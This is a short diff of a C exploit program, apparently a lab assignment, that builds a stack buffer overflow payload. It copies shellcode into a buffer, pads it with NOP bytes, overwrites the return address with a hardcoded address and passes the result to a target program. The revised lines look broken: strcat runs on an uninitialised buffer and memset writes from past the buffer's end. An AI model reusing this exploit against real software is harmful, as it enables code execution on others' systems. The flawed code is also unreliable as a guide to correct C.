@@ -18,13 +18,12 @@ main ( int argc, char * argv[] )
 	char *	env[1];
 	char attack_buffer[BUF_SIZE];
 
-	for (int i = 0; i < SHELL_SIZE; i++)
-		attack_buffer[i] = shellcode[i];
-	for (int i = SHELL_SIZE; i < BUF_SIZE; i++)
-		attack_buffer[i] = 0x90;
+	strcat(attack_buffer, shellcode);
+	memset(&attack_buffer[BUF_SIZE], 0x90, 120 - BUF_SIZE);
 
 	int *ret_address = (int*)&attack_buffer[BUF_TO_RET];
-	*ret_address = BUF_ADDR;
+	char* retaddr = (char*)0x2021fe10;
+	SET_VALUE(attack_buffer, 120, retaddr);
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
